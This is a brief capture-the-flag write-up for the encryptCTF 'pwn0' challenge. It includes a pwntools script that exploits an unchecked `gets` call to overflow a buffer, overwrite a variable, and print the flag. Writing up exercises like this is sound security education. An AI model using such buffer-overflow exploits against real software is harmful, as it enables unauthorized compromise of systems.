# 🔑 Write-Up

We see that is used `gets` to read the string. We can exploit this fact to overwrite the `josh` variable with the required string `H!gh`.

```python
from pwn import *

context.binary = "./pwn0"

p = process()
p.sendline(b"A" * 64 + b"H!gh")
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```

### 🚩 Flag

```plain
encryptCTF{L3t5_R4!53_7h3_J05H}
```